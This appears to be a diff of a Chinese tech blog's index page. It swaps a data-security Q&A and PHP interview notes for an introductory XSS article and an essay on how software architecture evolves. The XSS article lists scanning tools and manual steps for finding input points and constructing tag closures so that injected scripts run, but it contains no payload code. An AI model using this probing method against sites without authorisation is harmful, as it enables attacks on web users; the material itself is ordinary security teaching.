-<p>A4：<br>预算充足就做好数据安全技术+管理+运营一体化，预算不多就买几台设备，完善数据安全管理制度（结合老板的需求）。这是数据生命周期管控的部分，再结合具体业务场景优化。</p>
-<p>Q：你们RDP怎么管的？会设置白名单嘛？还是全禁了？<br>A1：<br>RDP，SSH全禁。</p>
-<p>A2：<br>全部用堡垒机，不允许开什么SSH，RDP那些玩意。</p>
-<p>A3：<br>看业务需求，正常是可以全禁，如果有需求再走特殊申请。</p>
-<p>A4：<br>局域网RDP让它随便玩了，外网主要靠发通知。</p>
-<p>Q：站在审计监督部的角度，数据安全审计工作应该怎么做呢？<br>A1：<br>行为审计，权限审计。</p>
-<p>A2：<br>审计主要看管理制度的合理性，有没有按照制度有效执行吧。</p>
-<p>A3：<br>如果是这个角度，才不管你怎么做呢，你只要有制度、有流程、有记录、有技术平台支撑就行。</p>
-<p>A4：<br>是的，主要就是审计监督的角度就不是技术了。</p>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2026/09/19/pantesting-note/">
-                渗透笔记
+            <a href="/2026/09/19/xss/">
+                XSS跨站脚本攻击
             </a>
         </h1>
         <div class="post-info">
@@ -665,7 +393,32 @@
 
     
         <div class="content">
-            
+            <h1 id="XSS漏洞原理"><a href="#XSS漏洞原理" class="headerlink" title="XSS漏洞原理"></a>XSS漏洞原理</h1><p>XSS属于客户端攻击，受害者最终是用户，但特别要注意的是网站管理人员也属于用户之一。这就意味着XSS可以进行“服务端”攻击，因为管理员要比普通用户的权限大得多，一般管理员都可以对网站进行文件管理，数据管理等操作，而攻击者一般也是靠管理员身份作为“跳板”进行实施攻击。</p>
+<blockquote>
+<p>XSS的重点不在于跨站点，而在于脚本的执行。那么XSS的原理是：<br>恶意攻击者在web页面中会插入一些恶意的script代码。当用户浏览该页面的时候，那么嵌入到web页面中script代码会执行，因此会达到恶意攻击用户的目的。那么XSS攻击最主要有如下分类：反射型、存储型、及 DOM-based型。 反射性和DOM-baseed型可以归类为非持久性XSS攻击。存储型可以归类为持久性XSS攻击。</p>
+</blockquote>
+<ol>
+<li>XSS漏洞出现的原因</li>
+</ol>
+<p>程序对输入和输出的控制不够严格,导致”精心构造“的脚本输入后,在输到前端时被浏览器当作有效代码解析执行从而产生危害。</p>
+<ol start="2">
+<li>XSS的分类</li>
+</ol>
+<ul>
+<li>反射型XSS或不持久型XSS(中危)</li>
+<li>储存型XSS 或持久型 XSS（高危）</li>
+<li>DOM XSS</li>
+</ul>
+<ol start="3">
+<li>测试方法<br>1、工具扫描：APPscan、AWVS</li>
+</ol>
+<p>2、手工测试：Burpsuite、firefox(hackbar)、XSSER XSSF</p>
+<p>使用手工检测Web应用程序是否存在XSS漏洞时，最重要的是考虑那里有输入，输入的数据在什么地方输出。在进行手工检测XSS时，人毕竟不像软件那样不知疲惫，所以一定要选择有特殊意义的字符，这样可以快速测试是否存在XSS。</p>
+<p>（1）在目标站点上找到输入点,比如查询接口,留言板等;</p>
+<p>（2）输入一组”特殊字符+唯一识别字符”,点击提交后,查看返回的源码,是否有做对应的处理;</p>
+<p>（3）通过搜索定位到唯一字符,结合唯一字符前后语法确认是否可以构造执行js的条件(构造闭合);提交构造的脚本代码,看是否可以成功执行,如果成功执行则说明存在XSS漏洞;</p>
+<h1 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h1><p>[引用]<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/421932.html">https://www.freebuf.com/vuls/421932.html</a></p>
+
         </div>
     
 
@@ -676,8 +429,8 @@
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2026/09/19/php-interview/">
-                PHP 面试题
+            <a href="/2026/09/19/software-structure/">
+                软件架构演变
             </a>
         </h1>
         <div class="post-info">
@@ -687,7 +440,7 @@
             
             
                 <span class="category">
-                    <a href="/categories/面试/">面试</a>
+                    <a href="/categories/架构/">架构</a>
                 </span>
             
         </div>
@@ -695,413 +448,70 @@
 
     
         <div class="content">
-            <ul>
-<li><a href="#1">PHP</a><ul>
-<li><a href="#1.1">运行模式</a></li>
-<li><a href="#1.2">Nginx与Apache解析php文件</a></li>
-<li><a href="#1.3">设计模式</a></li>
-<li><a href="#1.4">Session与Cookie</a></li>
-<li><a href="#1.5">闭包</a></li>
-<li><a href="#1.6">单双引号区别</a></li>
-<li><a href="#1.7">include和require的区别</a></li>
-</ul>
-</li>
-<li><a href="#2">PHP优化与高并发</a><ul>
-<li><a href="#2.1">优化方案</a></li>
-<li><a href="#2.2">PSR-4代码规范</a></li>
-<li><a href="#2.3">微服务</a></li>
-<li><a href="#2.4">抽象类与接口区别</a></li>
-<li><a href="#2.5">垃圾回收机制</a></li>
-<li><a href="#2.6">高并发优化</a></li>
-</ul>
-</li>
-<li><a href="#3">Mysql</a><ul>
-<li><a href="#3.1">myisam和innodb区别以及事务四大特性</a></li>
-<li><a href="#3.2">mysql索引</a></li>
-<li><a href="#3.3">主从-分库分表-锁</a></li>
-<li><a href="#3.4">如何定位慢查询</a></li>
-</ul>
-</li>
-<li><a href="#4">MongoDB</a> </li>
-<li><a href="#5">Redis</a><ul>
-<li><a href="#5.1">Redis和Memcache区别</a></li>
-<li><a href="#5.2">Redis常见数据结构</a></li>
-<li><a href="#5.3">Redis缓存雪崩、缓存穿透、缓存击穿</a></li>
-<li><a href="#5.4">Redis淘汰策略</a> </li>
-<li><a href="#5.5">Redis分布式锁怎么实现</a></li>
-<li><a href="#5.6">Redis的持久化机制:RDB-vs-AOF</a></li>
-<li><a href="#5.7">Redis主从哨兵和集群的区别</a></li>
-<li><a href="#5.8">节点扩容不同</a></li>
-</ul>
-</li>
-<li><a href="#6">MQ</a><ul>
-<li><a href="#6.1">RabbitMQ,RocketMQ,Kafka区别</a></li>
-</ul>
-</li>
-<li><a href="#7">服务器&amp;其它方面</a>  <ul>
-<li><a href="#7.1">swoole</a></li>
-<li><a href="#7.2">phpunit</a></li>
-<li><a href="#7.3">php-cs-fixer</a></li>
-<li><a href="#7.4">docker多版本启动共用</a></li>
-</ul>
-</li>
-</ul>
-<h2 id="php面试题"><a href="#php面试题" class="headerlink" title="php面试题"></a>php面试题</h2><h3 id="1">PHP</h3>
-<h4 id="1.1">运行模式</h4>
-
-
+            <h2 id="前端了解"><a href="#前端了解" class="headerlink" title="前端了解"></a>前端了解</h2><p>浏览器基本内核：</p>
 <ul>
-<li>CGI（通用网关接口&#x2F; Common Gateway Interface）</li>
-<li>FastCGI（常驻型CGI &#x2F; Long-Live CGI）lamp</li>
-<li>CLI（命令行运行 &#x2F; Command Line Interface）</li>
-<li>Web模块模式（Apache等Web服务器运行的模式）</li>
-<li>ISAPI（Internet Server Application Program Interface）</li>
+<li>IE(7,8,9,10 这几个版本难以兼容) -&gt; Trident内核 （目前淘汰）</li>
+<li>Chrome: Webkit内核 -&gt; Blink内核</li>
+<li>火狐: Gecko内核</li>
+<li>Safari: Webkit内核</li>
+<li>Opera: Presto -&gt; Webkit内核 -&gt; Blink内核</li>
 </ul>
-<h4 id="1.2">Nginx与Apache解析php文件</h4>
-
+<h2 id="单体架构"><a href="#单体架构" class="headerlink" title="单体架构"></a>单体架构</h2><p>在单体架构的体系内，对象关系映射（ORM）框架是一个至关重要的组件，其主要功能在于抽象化和简化数据库的增删改查（CRUD）操作。ORM通过封装底层数据库操作的复杂性，显著提升了数据访问层的开发效率。ORM框架的核心功能在于将关系型数据库中的数据模型转换为应用程序中的对象模型，实现了数据访问的抽象化。此种映射机制有效地减少了开发者在进行数据库交互时所需编写的代码量，从而使得开发人员能够将更多的精力投入到业务逻辑的实现上，而非数据访问的具体技术细节。</p>
+<p><img src="/images/single-software-structure.png"></p>
+<p><em><strong>优点:</strong></em></p>
 <ul>
-<li>php是apache的一个模块，必须依靠web服务器才可以运行，在php引擎解析php文件，php引擎将html页面带给web服务器解析并返回客户端</li>
-<li>cgi与fastcgi协议，CGI common gateway interface, CGI缺点，每处理一个请求都要fork一个全新的进程，就有了fastCGI，一个进程内可以处理多个请求</li>
-<li>phpCGI是fastCGI管理器，后面就用了FPM已经集成到了php里(php-fpm进程管理)</li>
-<li>php-fpm监听的事socket文件，nginx通过location将所有php文件交给fpm处理</li>
+<li>开发的便捷性、部署的简洁性以及相对易于管理的横向扩展能力</li>
+<li>开发人员能够在一个统一的代码库中进行快速的迭代和调试，从而加速了开发进程</li>
 </ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">default.conf</span><br><span class="line">location ~ |.php<span class="variable">$&#123;</span></span><br><span class="line"><span class="variable">	include fastcgi_params</span></span><br><span class="line"><span class="variable">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="1.3"><a rel="https://refactoringguru.cn/design-patterns/php">设计模式（三大类）</a></h4>
-
+<p><em><strong>缺点:</strong></em></p>
 <ul>
-<li>创建型模式共五种：工厂方法模式、抽象工厂模式、单例模式、建造者模式、原型模式。</li>
-<li>结构型模式共七种：适配器模式、装饰器模式、代理模式、外观模式、桥接模式、组合模式、享元模式</li>
-<li>行为型模式共十一种：策略模式、模板方法模式、观察者模式、迭代子模式、责任链模式、命令模式、备忘录模式、状态模式、访问者模式、中介者模式、解释器模式</li>
+<li>系统的任何微小改动都可能触发对整个应用程序的重新部署，这不仅加剧了维护工作的复杂性，也提高了系统潜在的错误风险</li>
+<li>单体架构在处理大规模用户或数据时，其横向扩展能力受到限制，性能瓶颈成为一个显著问题</li>
 </ul>
-<h4 id="1.4">Session与Cookie</h4>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">cookie 客户端，保存用户信息的一种机制，</span><br><span class="line">Session 服务端，跟踪用户状态，保存用户会话</span><br><span class="line"></span><br><span class="line"><span class="comment"># 有效期上不同</span></span><br><span class="line">Cookie  开发可以通过设置cookie的属性，达到使cookie长期有效的效果。</span><br><span class="line">Session  session依赖于名为JSESSIONID的cookie，而cookie JSESSIONID的过期时间默认为-1，只需关闭窗口该session就会失效，因而session不能达到长期有效的效果</span><br><span class="line"></span><br><span class="line"><span class="comment"># 跨域</span></span><br><span class="line">cookie 支持跨域名访问。</span><br><span class="line">session 不支持跨域名访问。</span><br><span class="line"></span><br><span class="line"><span class="comment"># 什么是CSRF攻击，XSS攻击</span></span><br><span class="line">CSRF （Cross-site request forgery）跨站请求伪造,黑客建立一个伪造网站或发送邮箱带了一个正常URL链接来让正常用户访问，来让正常用户让自己浏览器里的COOKIE权限来执行一些非法请求，</span><br><span class="line">如转账，提权等操作</span><br><span class="line">!! 防范方法有，验证 HTTP Referer 字段；在请求地址中添加 token 并验证</span><br><span class="line"></span><br><span class="line">XSS 主要将XSS代码提交存储在服务器端（数据库，内存，文件系统等），下次请求目标页面时不用再提交XSS代码。当目标用户访问该页面获取数据时，XSS代码会从服务器解析之后加载出来，返回到浏览器做正常的HTML和JS解析执行，XSS攻击就发生了</span><br><span class="line">!! 防范方法:通过过滤是针对非法的HTML代码包括单双引号等，使用htmlspecialchars()函数</span><br></pre></td></tr></table></figure>
-
-<h4 id="1.5">闭包</h4>
-内部函数可以访问外部函数
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">init</span></span>() &#123;</span><br><span class="line">  var name = <span class="string">&quot;Mozilla&quot;</span>; // name 是一个被 init 创建的局部变量</span><br><span class="line">  <span class="keyword">function</span> <span class="function"><span class="title">displayName</span></span>() &#123;</span><br><span class="line">    // displayName() 是内部函数，一个闭包</span><br><span class="line">    alert(name); // 使用了父函数中声明的变量</span><br><span class="line">  &#125;</span><br><span class="line">  displayName();</span><br><span class="line">&#125;</span><br><span class="line">init();</span><br></pre></td></tr></table></figure>
-
-<h4 id="1.6">双引号和单引号的区别</h4>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">“<span class="variable">$aaa</span>” 解释变量</span><br><span class="line">‘<span class="variable">$ccc</span>’ 不解释变量</span><br></pre></td></tr></table></figure>
-<h4 id="1.7">include和require的区别</h4>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">require 首先执行，报错会终止程序</span><br><span class="line">include 如果包含的，报错会提示，继续执行下去</span><br></pre></td></tr></table></figure>
-<h3 id="2">PHP优化与高并发</h3>
-<h4 id="2.1">优化方案</h4>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="built_in">unset</span>(); <span class="comment"># 注销那些不用的变量尤其是大数组，以便释放内存</span></span><br><span class="line">2. str_replace函数比preg_replace函数快，但strtr函数的效率是str_replace函数的四倍</span><br><span class="line">3. 尽量不要在<span class="keyword">for</span>循环中使用函数，比如<span class="keyword">for</span> (<span class="variable">$x</span>=0; <span class="variable">$x</span> &lt; count(<span class="variable">$array</span>); <span class="variable">$x</span>)每循环一次都会调用count()函数</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h4 id="2.2">PSR-4代码规范</h4>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">composer如何实现？PSR-4是什么?</span><br><span class="line">1. 自动加载有两种方式（都是php内置的），一种是通过__autoload(),另一种是通过spl_autoload_register()。</span><br><span class="line"></span><br><span class="line">2.PSR是PHP Standards Recommendation的简称,制定的代码规范，简称PSR，是代码开发的事实标准</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h4 id="2.3">抽象类与接口区别</h4>
-
-
-<table>
-<thead>
-<tr>
-<th>特性</th>
-<th>抽象类</th>
-<th>接口</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>用于声明某一种事物，规范名称、参数，形成模块，未有详细的实现细节</td>
-<td>✅</td>
-<td>✅</td>
-</tr>
-<tr>
-<td>通过类来实现相关的细节工作</td>
-<td>✅</td>
-<td>✅</td>
-</tr>
-<tr>
-<td>抽象类的抽象方法与接口一样</td>
-<td>✅</td>
-<td>✅</td>
-</tr>
-<tr>
-<td>可继承</td>
-<td>✅</td>
-<td>✅</td>
-</tr>
-<tr>
-<td>有属性、普通方法、抽象方法</td>
-<td>✅</td>
-<td>❌只有常量</td>
-</tr>
-<tr>
-<td>抽象方法</td>
-<td>❌不一定要有抽象方法</td>
-<td>✅</td>
-</tr>
-<tr>
-<td>语法不同</td>
-<td>❌</td>
-<td>❌</td>
-</tr>
-<tr>
-<td>声明不同</td>
-<td>abstract关键字在类前声明，且有class声明为类</td>
-<td>用interface来声明，但不能用class来声明</td>
-</tr>
-<tr>
-<td>继承</td>
-<td>extends关键字让子类继承父类后，在子类实现详细的抽象方法</td>
-<td>用implements让普通类在类里实现接口的详细方法，且接口可以一次性实现多个方法，用逗号分开各个接口就可</td>
-</tr>
-</tbody></table>
-<p>抽象类与接口的结合</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">/* </span><br><span class="line">写此程序源于自己的猜测，想在抽象类里实现某一接口。 </span><br><span class="line">*/ </span><br><span class="line">interface work&#123; </span><br><span class="line">  public <span class="keyword">function</span> say(); </span><br><span class="line">&#125;</span><br><span class="line">abstract class a implements work&#123; </span><br><span class="line">  public <span class="keyword">function</span> <span class="function"><span class="title">showlove</span></span>()&#123; </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;love you&lt;br / &#x27;</span>; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">class b extends a&#123; </span><br><span class="line">  public <span class="keyword">function</span> <span class="function"><span class="title">say</span></span>()&#123; </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;hello, i m in b&#x27;</span>; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$k</span>=new b(); </span><br><span class="line"><span class="variable">$k</span>- say();</span><br><span class="line">/* </span><br><span class="line">以上程序能正常执行</span><br><span class="line">普通类implements接口后，就变成了抽象类了，这就好像是直接给抽象类增加了一个抽象方法。</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
-
-<p>接口与继承的结合</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">interface kk&#123; </span><br><span class="line">  public <span class="keyword">function</span> say(); </span><br><span class="line">&#125;</span><br><span class="line">class a &#123; </span><br><span class="line">  public <span class="keyword">function</span> <span class="function"><span class="title">show</span></span>()&#123; </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;我是父类&lt;br / &#x27;</span>; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">class b extends a implements kk&#123; </span><br><span class="line">  public <span class="keyword">function</span> <span class="function"><span class="title">say</span></span>()&#123; </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;我是继承A类，同时实现say接口的&lt;br / &#x27;</span>; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span>=new b(); </span><br><span class="line"><span class="variable">$b</span>- show();//我是父类</span><br><span class="line"><span class="variable">$b</span>- say();//我是继承A类，同时实现say接口的</span><br></pre></td></tr></table></figure>
-
-<h4 id="2.4">微服务</h4>
-
-<p>优势：</p>
+<p><em><strong>基本框架：</strong></em></p>
 <ul>
-<li>独立开发 – 所有微服务都可以根据各自的功能轻松开发</li>
-<li>独立部署 – 基于其服务，可以在任何应用程序中单独部署它们</li>
-<li>故障隔离 – 即使应用程序的一项服务不起作用，系统仍可继续运行</li>
-<li>混合技术堆栈 – 可以使用不同的语言和技术来构建同一应用程序的不同服务</li>
-<li>粒度缩放 – 单个组件可根据需要进行缩放，无需将所有组件缩放在一起</li>
+<li>前端 - angular jq 模版引擎ecshop(smart)</li>
+<li>后台 - Java(spring mvc, Struts2) PHP(Yii2 zendFramework2, thinkphp3.2)</li>
 </ul>
-<p>特点：</p>
+<h2 id="多层架构"><a href="#多层架构" class="headerlink" title="多层架构"></a>多层架构</h2><p>应用程序被细分为多个层次，主要包括表现层（用户界面）、业务逻辑层和数据访问层，这一模式通常被称作模型-视图-控制器（MVC）。这种分层的设计方法允许每一层独立进行开发和测试，从而显著提升了代码的可管理性和可维护性。</p>
+<p>多层架构的设计理念体现了专业领域分工的细化，即所谓的垂直领域专业化。它是社会分工精细化趋势在软件开发领域的体现。在这种架构中，前后端的分离正是一种垂直拆分的实践，而MVC本身也是垂直架构的一个典型示例。</p>
+<p><img src="/images/mult-software-structure.png"></p>
+<p><em><strong>优点:</strong></em></p>
 <ul>
-<li>解耦 – 系统内的服务很大程度上是分离的。因此，整个应用程序可以轻松构建，更改和扩展</li>
-<li>组件化 – 微服务被视为可以轻松更换和升级的独立组件</li>
-<li>业务能力 – 微服务非常简单，专注于单一功能</li>
-<li>自治 – 开发人员和团队可以彼此独立工作，从而提高速度</li>
-<li>持续交付 – 通过软件创建，测试和批准的系统自动化，允许频繁发布软件</li>
-<li>责任 – 微服务不关注应用程序作为项目。相反，他们将应用程序视为他们负责的产品</li>
-<li>分散治理 – 重点是使用正确的工具来做正确的工作。这意味着没有标准化模式或任何技术模式。开发人员可以自由选择最有用的工具来解决他们的问题</li>
-<li>敏捷 – 微服务支持敏捷开发。任何新功能都可以快速开发并再次丢弃</li>
+<li>尽管层与层之间的耦合较单体架构有所减少<br><em><strong>缺点:</strong></em></li>
+<li>某一层的变更仍有可能引发连锁反应，影响到其他层的稳定性和功能。</li>
 </ul>
-<h4 id="2.5">垃圾回收机制</h4>
-
+<p>一般会采用敏捷开发杜绝此类现象，产品周期性迭代<br>逐渐有了devops的概念</p>
+<h3 id="读写分离的数据库架构"><a href="#读写分离的数据库架构" class="headerlink" title="读写分离的数据库架构"></a>读写分离的数据库架构</h3><p><img src="/images/rw-software-structure.png"></p>
+<p><em><strong>原因：</strong></em><br>公司又增加了很多新的业务，系统也增加了更多的功能。预定蔬菜的商户也可以通过手机查看历史订单和各种统计信息了，即使怎么增加应用服务器，也会出现用户需要等待很长的时间，最终数据库也出现了瓶颈。</p>
+<p><em><strong>解决方案：读写分离</strong></em><br>数据库是分布式架构中最难的问题，因为不像应用服务器是不保存数据的。如果想要增加数据库服务器的数量，那么首先需要解决数据重复和一致性的问题。现实中对应的方案有很多，例如读写分离、数据库物理分区、逻辑分表、逻辑分库，但本质上讲只是拆分数据库操作的方式不同而已，而我们应对数据库性能最常用和性价比最高的方式是读写分离</p>
+<p>有了锁的概念 读写锁 乐观锁 悲观锁 </p>
+<h3 id="用消息队列的架构"><a href="#用消息队列的架构" class="headerlink" title="用消息队列的架构"></a>用消息队列的架构</h3><p><img src="/images/rw-cache-software-structure.png"></p>
+<p><em><strong>原因：</strong></em><br>相应的系统中往往存在这种类似的场景，当我们视频网站上传了一条视频后，视频网站往往会进行转码以便适合网络播放，这种操作需要耗费大量的服务器资源，不可能实时的在用户点击提交后处理完毕，否则用户需要等待很久，甚至连接超时。</p>
+<p><em><strong>解决方案：消息队列</strong></em><br>我们可以让此类任务不必是实时完成的。当用户提交请求后，系统会把任务添加到消息队列中，完成之后改变数据的状态，用户在刷新或接到通知后知道任务已经处理完毕。<br>随着业务的发展，公司开始向新的领域扩张，开发了拓展更多商户的代理平台和物流平台，甚至需要和和第三方平台对接，而且需要保证这些平台中一些通用的数据和逻辑是一致的。</p>
+<h3 id="过度阶段-面向服务的架构SOA"><a href="#过度阶段-面向服务的架构SOA" class="headerlink" title="过度阶段 面向服务的架构SOA"></a>过度阶段 面向服务的架构SOA</h3><p><em><strong>原因：</strong></em><br>软件系统变得越来越复杂，参与的开发者就越多，应用系统的分离和分化就变得很有意义了。面向前端的API应用服务器不再真正的处理业务逻辑而是调用专门的服务器来完成。</p>
+<p>单点登录（SSO）是一个典型的面向服务的架构，在互联网公司中被广泛使用。国内互联网巨头往往拥有多个系统，例如腾讯的QQ音乐、空间都可以使用同一个QQ号登陆。于是用户服务和认证服务被剥离开来，各个系统之间通过统一登录和管理用户信息，用户的体验得到了极大的提升，这就是面向服务架构的一个例子。</p>
+<p><img src="/images/SSO-software-structure.png"></p>
+<p>这些大厂不仅在自己的系统内完成了统一的认证和用户管理，并且把登录、授权的服务开放给第三方系统。例如很多网站支持微信登录，这样用户就可以使用一套用户名密码登录大量接入的系统。并且业界有一个通用规范，便于各种系接入，这就是OAuth标准。</p>
+<p><img src="/images/OAuth-software-structure.png"></p>
+<p>通过面向服务的架构改造，系统中分化出了用户服务、物流服务、订单服务等服务，通过OAuth的方式提供了收银机系统认证对接。一些收银机厂商也对接了这个系统，商户可以通过支持的收银设备进行下食材的预定操作了。</p>
+<h2 id="微服务架构"><a href="#微服务架构" class="headerlink" title="微服务架构"></a>微服务架构</h2><p>微服务架构（Microservices Architecture）的兴起源于对传统应用架构的局限性的突破。随着信息技术和互联网的快速发展，企业对于应用的扩展性、可靠性和维护性提出了更高的要求。传统应用架构由于其整体性和复杂性，逐渐难以满足这些需求。在这样的背景下，微服务架构应运而生，以其独特的优势，逐渐成为分布式系统设计的主流架构之一。</p>
+<p>微服务架构是一种分布式系统架构，其核心思想是将一个复杂的应用分解为一组相互协作的微小服务。每个微服务都是独立的业务单元，运行在自己的进程中，并通过轻量级的通信机制（如HTTP RESTful API）相互协作。这些服务围绕业务功能构建，每个服务都有自己的业务逻辑和数据存储，可以独立部署和扩展。</p>
+<p><img src="/images/micro-software-structure.png"></p>
+<p>不同应用和数据之间互相依赖，逻辑纠缠不清，项目的部署进入了混沌状态，对于大型、依赖关系复杂的系统需要一个更为有力的架构。为了解决系统复杂性和服务解耦的问题，这时候该微服务和领域驱动建模（DDD）出场了。</p>
+<p>将不同职责的服务独立部署，从而实现服务内部高内聚，服务之间低耦合的效果，让开发变得更为灵活。当然“分开是为了更好的在一起”，为了重新组合和稳定运行这些服务，人们发明了服务发现、熔断机制、服务部署监控等一篮子工具。</p>
+<p>优点:</p>
 <ul>
-<li>PHP垃圾回收机制</li>
+<li>它通过模块化提高了系统的可维护性和可扩展性。每个微服务都是独立的模块，可以单独开发和部署，不会影响到其他服务。</li>
+<li>微服务架构通过服务之间的松耦合，提高了系统的可靠性</li>
+<li>每个服务都有自己的数据存储，避免了单点故障的风险。此外，微服务架构支持技术多样性，每个服务都可以选择最适合其业务需求的技术栈，从而充分发挥各种技术的优势。</li>
 </ul>
-<p><code>PHP5.3版本</code>之前,使用的垃圾回收机制是单纯的“引用计数”<br>但是当两个或多个对象互相引用形成环状后，内存对象的计数器则不会消减为0,<br>这一组内存对象已经没用了，但是不能回收，从而导致内存泄露的现象<br>每个php变量存在一个叫”zval”的变量容器中。一个zval变量容器，除了包含变量的类型和值</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xdebug_debug_zval( <span class="string">&#x27;a&#x27;</span> ); <span class="comment"># Xdebug来检查引用计数情况</span></span><br></pre></td></tr></table></figure>
-<p>从<code>PHP7的NTS版本</code>开始，以上例程的引用将不再被计数<br>对于null，bool，int和double的类型变量，refcount永远不会计数；<br>对于对象、资源类型，refcount计数和php5的一致；<br>字符串引用，计数不变，&amp;地址发生改变<br>数组引用，键值不变的情况下计数<br>改变后引用全部作废，重新计算</p>
+<p>缺点: </p>
 <ul>
-<li>回收周期</li>
+<li>相较于传统应用架构，微服务架构更为复杂，需要更多的管理和协调工作。管理难度大</li>
+<li>微服务架构需要更多的工作量来设计、开发、测试、部署和管理多个小型服务，这增加了开发团队的负担 成本高</li>
 </ul>
-<p><code>zend.enable_gc</code><code>php.ini</code>默认是打开的</p>
-<ul>
-<li>性能影响</li>
-</ul>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/benbenhan/articles/15904812.html">https://www.cnblogs.com/benbenhan/articles/15904812.html</a><br><a target="_blank" rel="noopener" href="https://docs.kilvn.com/tipi/chapt06/06-04-00-garbage-collection.html">https://docs.kilvn.com/tipi/chapt06/06-04-00-garbage-collection.html</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11843?time__1311=Cq0xuD0DnD203GNem=DRiKKpc8Q7W4D">https://xz.aliyun.com/t/11843?time__1311=Cq0xuD0DnD203GNem%3DDRiKKpc8Q7W4D</a></p>
-<h4 id="2.6">高并发优化</h4>
-
-<ul>
-<li>流量优化 - 防盗链处理</li>
-<li>前端优化<ol>
-<li>减少http请求次数</li>
-<li>添加异步请求</li>
-<li>启用浏览器缓存和文件压缩</li>
-<li>CDN加速</li>
-<li>建立独立的图片服务器(减少I&#x2F;O)</li>
-</ol>
-</li>
-<li>服务端优化<ol>
-<li>页面静态化</li>
-<li>并发处理</li>
-<li>队列处理</li>
-</ol>
-</li>
-<li>数据库优化<ol>
-<li>数据库缓存</li>
-<li>分库分表,分区</li>
-<li>读写分离</li>
-<li>负载均衡</li>
-</ol>
-</li>
-<li>web服务器优化<ol>
-<li>nginx反向代理实现负载均衡</li>
-<li>lvs实现负载均衡</li>
-</ol>
-</li>
-</ul>
-<h3 id="3">Mysql</h3>
-<h4 id="3.1">myisam和innodb区别以及事务四大特性</h4>
-
-<h4 id="3.2">mysql索引</h4>
-
-<blockquote>
-<p>从数据结构角度</p>
-</blockquote>
-<ul>
-<li>B+树索引(O(log(n)))：关于B+树索引，可以参考 MySQL索引背后的数据结构及算法原理</li>
-<li>hash索引：</li>
-</ul>
-<blockquote>
-<p>从物理存储角度</p>
-</blockquote>
-<ul>
-<li>聚集索引（clustered index）</li>
-<li>非聚集索引（non-clustered index）</li>
-</ul>
-<blockquote>
-<p>从逻辑角度</p>
-</blockquote>
-<ul>
-<li>主键索引：主键索引是一种特殊的唯一索引，不允许有空值</li>
-<li>普通索引或者单列索引</li>
